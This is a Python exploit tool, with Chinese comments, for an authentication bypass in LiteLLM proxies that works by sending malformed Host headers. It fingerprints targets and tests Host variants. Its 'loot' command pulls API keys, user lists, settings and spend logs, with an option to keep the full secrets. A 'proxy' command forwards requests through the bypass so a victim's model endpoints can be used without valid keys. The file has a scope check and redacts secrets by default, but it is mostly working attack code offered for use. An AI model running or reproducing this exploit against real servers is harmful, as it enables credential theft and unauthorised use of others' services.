#!/usr/bin/env python3
"""LiteLLM BadHost 鉴权绕过（CVE-2026-49468 / GHSA-4xpc-pv4p-pm3w）探针 + 本地兼容代理。

对齐 Playbook：传承/灯笼·破印.md

示例:
  python3 炼蛊房/litellm_badhost.py probe --base http://授权:4000 --case <案卷>
  python3 炼蛊房/litellm_badhost.py loot  --base http://授权:4000 --case <案卷>
  python3 炼蛊房/litellm_badhost.py proxy --upstream http://授权:4000 --listen 127.0.0.1:8800
"""
from __future__ import annotations

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, UTC
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from typing import Any

OPS = Path(__file__).resolve().parent
ENGINE = (OPS.parent if (OPS.parent / "杀招").is_dir() else (OPS.parent if (OPS.parent / "杀招").is_dir() else OPS.parents[1]))
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))

from scope_lib import host_of, in_scope  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-litellm_badhost"

LOOT_PATHS = (
    "/spend/keys",
    "/key/info",
    "/key/list",
    "/user/info",
    "/user/list",
    "/settings",
    "/get/model/info",
    "/model/info",
    "/models",
    "/v1/models",
    "/global/spend/logs",
    "/spend/logs",
    "/health",
    "/health/liveliness",
)

ANTHROPIC_STRIP_KEYS = {
    "thinking",
    "cache_control",
    "anthropic_version",
    "anthropic_beta",
}



def _ssl_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _now() -> str:
    return datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")


def case_dir(case: str) -> Path:
    d = ENGINE / "案卷" / case / "测绘" / "litellm_badhost"
    d.mkdir(parents=True, exist_ok=True)
    return d


def ensure_scope(url: str) -> None:
    h = host_of(url)
    if not h:
        raise SystemExit("[scope] 无法解析 host")
    if h in ("127.0.0.1", "localhost", "::1"):
        return
    if not in_scope(h):
        raise SystemExit(f"[scope] {h} 不在授权范围，拒绝请求")


def ssl_ctx(insecure: bool) -> ssl.SSLContext:
    return ssl._create_unverified_context() if insecure else ssl.create_default_context()


def parse_base(base: str) -> tuple[str, str, int]:
    u = urllib.parse.urlsplit(base if "://" in base else "http://" + base)
    scheme = u.scheme or "http"
    host = u.hostname or ""
    port = u.port or (443 if scheme == "https" else 80)
    return scheme, host, port


def host_variants(host: str, port: int) -> list[dict[str, str]]:
    hp = f"{host}:{port}" if port not in (80, 443) else host
    raw = [
        ("normal", hp),
        ("badhost_slash_q", f"{hp}/?"),
        ("badhost_q", f"{hp}?"),
        ("badhost_health", f"{hp}/health"),
        ("badhost_slash", f"{hp}/"),
        ("badhost_models", f"{hp}/models"),
        ("localhost", "127.0.0.1"),
        ("localhost_port", f"127.0.0.1:{port}"),
        ("localhost_slash_q", "127.0.0.1/?"),
    ]
    seen: set[str] = set()
    out: list[dict[str, str]] = []
    for name, h in raw:
        if h in seen:
            continue
        seen.add(h)
        out.append({"name": name, "host": h})
    return out


def http_req(
    url: str,
    *,
    method: str = "GET",
    host_header: str | None = None,
    headers: dict[str, str] | None = None,
    body: bytes | None = None,
    insecure: bool = False,
    timeout: int = 20,
) -> dict[str, Any]:
    hdrs = {"User-Agent": UA, "Accept": "application/json,*/*"}
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=body, headers=hdrs, method=method)

    class ForceHostHTTP(urllib.request.HTTPHandler):
        def http_request(self, req2):  # type: ignore[no-untyped-def]
            req2 = urllib.request.HTTPHandler.http_request(self, req2)
            if host_header:
                req2.add_unredirected_header("Host", host_header)
                req2.headers["Host"] = host_header
            return req2

    class ForceHostHTTPS(urllib.request.HTTPSHandler):
        def __init__(self):
            super().__init__(context=ssl_ctx(insecure))

        def https_request(self, req2):  # type: ignore[no-untyped-def]
            req2 = urllib.request.HTTPSHandler.https_request(self, req2)
            if host_header:
                req2.add_unredirected_header("Host", host_header)
                req2.headers["Host"] = host_header
            return req2

    opener = urllib.request.build_opener(ForceHostHTTP, ForceHostHTTPS())
    try:
        with opener.open(req, timeout=timeout) as r:
            raw = r.read()[:2_000_000]
            return {
                "status": r.status,
                "len": len(raw),
                "body": raw.decode("utf-8", "replace"),
                "headers": {k.lower(): v for k, v in r.headers.items()},
            }
    except urllib.error.HTTPError as e:
        raw = e.read()[:500_000] if e.fp else b""
        return {
            "status": e.code,
            "len": len(raw),
            "body": raw.decode("utf-8", "replace"),
            "headers": {k.lower(): v for k, v in (e.headers.items() if e.headers else [])},
        }
    except Exception as e:
        return {"status": 0, "len": 0, "body": "", "error": str(e), "headers": {}}


def looks_litellm(body: str, headers: dict[str, str]) -> bool:
    blob = (" ".join(headers.values()) + " " + (body or "")).lower()
    keys = ("litellm", "berriai", "openai-compatible", "master_key", "virtual key", "spend")
    return any(k in blob for k in keys)


def redact_secrets(obj: Any, keep: int = 6) -> Any:
    if isinstance(obj, dict):
        out = {}
        for k, v in obj.items():
            lk = str(k).lower()
            if any(x in lk for x in ("key", "token", "secret", "password", "authorization", "api_key")):
                if isinstance(v, str) and len(v) > keep * 2:
                    out[k] = v[:keep] + "…" + v[-keep:]
                else:
                    out[k] = "***"
            else:
                out[k] = redact_secrets(v, keep)
        return out
    if isinstance(obj, list):
        return [redact_secrets(x, keep) for x in obj[:200]]
    if isinstance(obj, str) and (obj.startswith("sk-") or obj.startswith("sk-litellm-")) and len(obj) > 16:
        return obj[:6] + "…" + obj[-4:]
    return obj


def try_json(body: str) -> Any:
    try:
        return json.loads(body)
    except Exception:
        return None


def is_auth_denied(status: int, body: str) -> bool:
    if status in (401, 403):
        return True
    b = (body or "").lower()
    return any(x in b for x in ("invalid api key", "unauthorized", "authentication error", "no api key", "master key"))


def is_success_open(status: int, body: str) -> bool:
    if status != 200:
        return False
    if is_auth_denied(status, body):
        return False
    j = try_json(body)
    if j is None:
        return len(body) > 20 and "error" not in body.lower()[:80]
    if isinstance(j, dict) and j.get("error"):
        return False
    return True


def cmd_probe(args: argparse.Namespace) -> int:
    base = args.base.rstrip("/")
    ensure_scope(base)
    scheme, host, port = parse_base(base)
    out = case_dir(args.case)

    # fingerprint
    health = http_req(base + "/health", insecure=args.insecure, timeout=args.timeout)
    models_n = http_req(
        base + "/v1/models",
        headers={"Authorization": "Bearer invalid-probe-key"},
        insecure=args.insecure,
        timeout=args.timeout,
    )
    fingerprint = {
        "health": {"status": health.get("status"), "len": health.get("len"), "litellmish": looks_litellm(health.get("body", ""), health.get("headers", {}))},
        "models_invalid_key": {"status": models_n.get("status"), "denied": is_auth_denied(models_n.get("status", 0), models_n.get("body", ""))},
    }

    probe_path = args.path
    variants = host_variants(host, port)
    rows = []
    for v in variants:
        # 基准：正常 Host + 假 Key
        r_bad_key = http_req(
            base + probe_path,
            host_header=v["host"] if v["name"] != "normal" else None,
            headers={"Authorization": "Bearer totally-invalid-key"},
            insecure=args.insecure,
            timeout=args.timeout,
        )
        # 无 Key
        r_nokey = http_req(
            base + probe_path,
            host_header=v["host"] if v["name"] != "normal" else None,
            insecure=args.insecure,
            timeout=args.timeout,
        )
        open_bad = is_success_open(r_bad_key.get("status", 0), r_bad_key.get("body", ""))
        open_nk = is_success_open(r_nokey.get("status", 0), r_nokey.get("body", ""))
        bypass = bool(open_bad or open_nk) and v["name"] != "normal"
        # normal + invalid 若也 200，说明本身未开 auth，不算 BadHost
        if v["name"] == "normal" and (open_bad or open_nk):
            bypass = False
        row = {
            "variant": v["name"],
            "host": v["host"],
            "path": probe_path,
            "with_fake_key": {
                "status": r_bad_key.get("status"),
                "len": r_bad_key.get("len"),
                "open": open_bad,
                "error": r_bad_key.get("error"),
                "head": (r_bad_key.get("body") or "")[:180],
            },
            "no_key": {
                "status": r_nokey.get("status"),
                "len": r_nokey.get("len"),
                "open": open_nk,
                "error": r_nokey.get("error"),
                "head": (r_nokey.get("body") or "")[:180],
            },
            "bypass_candidate": bypass,
        }
        rows.append(row)
        flag = "BYPASS" if bypass else ("OPEN" if (open_bad or open_nk) and v["name"] == "normal" else "deny")
        print(f"  [{flag}] {v['name']:18} Host={v['host']!r:28} fake={r_bad_key.get('status')} nokey={r_nokey.get('status')}")

    hits = [r for r in rows if r.get("bypass_candidate")]
    # 若 normal 未开 auth，单独标记
    normal_open = any(r["variant"] == "normal" and (r["with_fake_key"]["open"] or r["no_key"]["open"]) for r in rows)
    report = {
        "ts": _now(),
        "cve": "CVE-2026-49468",
        "advisory": "GHSA-4xpc-pv4p-pm3w",
        "fixed_in": "litellm>=1.84.0",
        "base": base,
        "probe_path": probe_path,
        "fingerprint": fingerprint,
        "auth_disabled_suspected": normal_open,
        "bypass_hits": hits,
        "results": rows,
        "success": bool(hits) or normal_open,
    }
    path = out / "probe.json"
    path.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"[ok] bypass_hits={len(hits)} auth_disabled={normal_open} -> {path}")
    if hits:
        best = hits[0]["host"]
        print(f"[next] loot --base {base} --bad-host {best!r} --case {args.case}")
    return 0 if (hits or normal_open) else 2


def cmd_loot(args: argparse.Namespace) -> int:
    base = args.base.rstrip("/")
    ensure_scope(base)
    scheme, host, port = parse_base(base)
    out = case_dir(args.case)

    bad_hosts = [args.bad_host] if args.bad_host else [v["host"] for v in host_variants(host, port) if v["name"] != "normal"]
    # 先用 probe 最优：优先 /?
    prefer = [h for h in bad_hosts if h.endswith("/?") or h.endswith("?")]
    ordered = prefer + [h for h in bad_hosts if h not in prefer]

    collected = []
    working_host = None
    for bh in ordered:
        # 用 /spend/keys 或 /v1/models 探活
        test = http_req(
            base + "/v1/models",
            host_header=bh,
            headers={"Authorization": "Bearer x"},
            insecure=args.insecure,
            timeout=args.timeout,
        )
        if is_success_open(test.get("status", 0), test.get("body", "")):
            working_host = bh
            print(f"[loot] using BadHost={bh!r}")
            break
    if not working_host and args.force_host:
        working_host = args.force_host
        print(f"[loot] force Host={working_host!r}")
    if not working_host:
        # 再试无 auth 直连
        test = http_req(base + "/v1/models", headers={"Authorization": "Bearer x"}, insecure=args.insecure, timeout=args.timeout)
        if is_success_open(test.get("status", 0), test.get("body", "")):
            working_host = None
            print("[loot] auth appears disabled; looting with normal Host")
        else:
            print("[loot] no working BadHost; run probe first")
            return 2

    for p in LOOT_PATHS:
        r = http_req(
            base + p,
            host_header=working_host,
            headers={"Authorization": "Bearer x"},
            insecure=args.insecure,
            timeout=args.timeout,
        )
        j = try_json(r.get("body") or "")
        open_ok = is_success_open(r.get("status", 0), r.get("body") or "")
        item = {
            "path": p,
            "status": r.get("status"),
            "len": r.get("len"),
            "open": open_ok,
            "json": (j if args.raw else redact_secrets(j)) if j is not None else None,
            "head": (r.get("body") or "")[:240] if j is None else None,
            "error": r.get("error"),
        }
        collected.append(item)
        flag = "OPEN" if open_ok else "deny"
        print(f"  [{flag}] {p:28} status={r.get('status')} len={r.get('len')}")

    report = {
        "ts": _now(),
        "base": base,
        "bad_host": working_host,
        "raw_secrets": bool(args.raw),
        "open_paths": [c["path"] for c in collected if c.get("open")],
        "items": collected,
    }
    path = out / ("loot_raw.json" if args.raw else "loot.json")
    path.write_text(json.dumps(report, ensure_ascii=False, indent=2) + "\n", encoding="utf-8")
    print(f"[ok] open={len(report['open_paths'])} -> {path}")
    if args.raw:
        print("[warn] loot_raw.json 含完整密钥，勿同步公开仓库")
    return 0 if report["open_paths"] else 2


def strip_anthropic(obj: Any) -> Any:
    if isinstance(obj, dict):
        out = {}
        for k, v in obj.items():
            if k in ANTHROPIC_STRIP_KEYS:
                continue
            # 嵌套 content blocks 里的 cache_control
            out[k] = strip_anthropic(v)
        return out
    if isinstance(obj, list):
        return [strip_anthropic(x) for x in obj]
    return obj


def cmd_proxy(args: argparse.Namespace) -> int:
    upstream = args.upstream.rstrip("/")
    ensure_scope(upstream)
    scheme, host, port = parse_base(upstream)
    bad_host = args.bad_host or f"{host}:{port}/?" if port not in (80, 443) else f"{host}/?"
    listen_host, listen_port_s = args.listen.rsplit(":", 1)
    listen_port = int(listen_port_s)

    class Handler(BaseHTTPRequestHandler):
        protocol_version = "HTTP/1.1"

        def log_message(self, fmt: str, *a: Any) -> None:
            sys.stderr.write("[proxy] " + (fmt % a) + "\n")

        def _cors(self) -> None:
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods", "GET,POST,OPTIONS")
            self.send_header("Access-Control-Allow-Headers", "*")

        def do_OPTIONS(self) -> None:  # noqa: N802
            self.send_response(204)
            self._cors()
            self.end_headers()

        def do_GET(self) -> None:  # noqa: N802
            self._forward("GET")

        def do_POST(self) -> None:  # noqa: N802
            self._forward("POST")

        def _map_path(self, path: str) -> str:
            # /v1/models → /models（部分上游）；默认保留 /v1/*
            if path.startswith("/v1/models"):
                return path  # LiteLLM 两者常都有；优先原样
            if path.startswith("/v1/chat/completions"):
                return path
            return path

        def _forward(self, method: str) -> None:
            parsed = urllib.parse.urlsplit(self.path)
            up_path = self._map_path(parsed.path)
            if parsed.query:
                up_path = up_path + "?" + parsed.query
            url = upstream + up_path

            length = int(self.headers.get("Content-Length") or 0)
            body = self.rfile.read(length) if length else None
            if body and "application/json" in (self.headers.get("Content-Type") or ""):
                try:
                    obj = json.loads(body.decode("utf-8"))
                    obj = strip_anthropic(obj)
                    body = json.dumps(obj).encode("utf-8")
                except Exception:
                    pass

            hdrs = {
                "User-Agent": UA,
                "Authorization": self.headers.get("Authorization") or "Bearer bypass",
                "Content-Type": self.headers.get("Content-Type") or "application/json",
                "Accept": self.headers.get("Accept") or "application/json, text/event-stream",
            }
            # BadHost 注入
            req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
            # urllib 会覆盖 Host；用自定义 handler 强制
            class BadHostRedirect(urllib.request.HTTPHandler):
                def http_request(self, req2):  # type: ignore[no-untyped-def]
                    req2 = urllib.request.HTTPHandler.http_request(self, req2)
                    req2.add_unredirected_header("Host", bad_host)
                    req2.headers["Host"] = bad_host
                    return req2

            class BadHostHTTPS(urllib.request.HTTPSHandler):
                def __init__(self):
                    super().__init__(context=ssl_ctx(args.insecure))

                def https_request(self, req2):  # type: ignore[no-untyped-def]
                    req2 = urllib.request.HTTPSHandler.https_request(self, req2)
                    req2.add_unredirected_header("Host", bad_host)
                    req2.headers["Host"] = bad_host
                    return req2

            opener = urllib.request.build_opener(BadHostRedirect, BadHostHTTPS())
            try:
                resp = opener.open(req, timeout=args.timeout)
                status = getattr(resp, "status", 200)
                resp_headers = resp.headers
                data = resp.read()
            except urllib.error.HTTPError as e:
                status = e.code
                resp_headers = e.headers
                data = e.read() if e.fp else b""
            except Exception as e:
                msg = json.dumps({"error": str(e)}).encode()
                self.send_response(502)
                self._cors()
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(msg)))
                self.end_headers()
                self.wfile.write(msg)
                return

            self.send_response(status)
            self._cors()
            ct = resp_headers.get("Content-Type") if resp_headers else None
            if ct:
                self.send_header("Content-Type", ct)
            # SSE：原样透传
            self.send_header("Content-Length", str(len(data)))
            self.end_headers()
            self.wfile.write(data)

    print(f"[proxy] listen http://{listen_host}:{listen_port}")
    print(f"[proxy] upstream {upstream}")
    print(f"[proxy] BadHost {bad_host!r}")
    print("[proxy] map: /v1/models /v1/chat/completions → upstream; strip Anthropic fields; CORS *")
    httpd = ThreadingHTTPServer((listen_host, listen_port), Handler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n[proxy] stop")
    return 0


def main() -> int:
    ap = argparse.ArgumentParser(description="LiteLLM BadHost 鉴权绕过")
    sub = ap.add_subparsers(dest="cmd", required=True)

    p = sub.add_parser("probe", help="指纹 + BadHost 变异布尔/放行探针")
    p.add_argument("--base", required=True)
    p.add_argument("--case", required=True)
    p.add_argument("--path", default="/v1/models", help="探针路径，默认 /v1/models")
    p.add_argument("--insecure", action="store_true")
    p.add_argument("--timeout", type=int, default=20)
    p.set_defaults(func=cmd_probe)

    p = sub.add_parser("loot", help="绕过后拉取 settings/spend/keys/models（默认打码）")
    p.add_argument("--base", required=True)
    p.add_argument("--case", required=True)
    p.add_argument("--bad-host", default="", help="指定 Host，如 'ip:4000/?'")
    p.add_argument("--force-host", default="")
    p.add_argument("--raw", action="store_true", help="证据保留完整密钥（慎用）")
    p.add_argument("--insecure", action="store_true")
    p.add_argument("--timeout", type=int, default=20)
    p.set_defaults(func=cmd_loot)

    p = sub.add_parser("proxy", help="本机 OpenAI 兼容转发（BadHost+剥 Anthropic+CORS+SSE）")
    p.add_argument("--upstream", required=True)
    p.add_argument("--listen", default="127.0.0.1:8800")
    p.add_argument("--bad-host", default="", help="默认 host:port/?")
    p.add_argument("--insecure", action="store_true")
    p.add_argument("--timeout", type=int, default=120)
    p.set_defaults(func=cmd_proxy)

    args = ap.parse_args()
    return int(args.func(args) or 0)


if __name__ == "__main__":
    raise SystemExit(main())
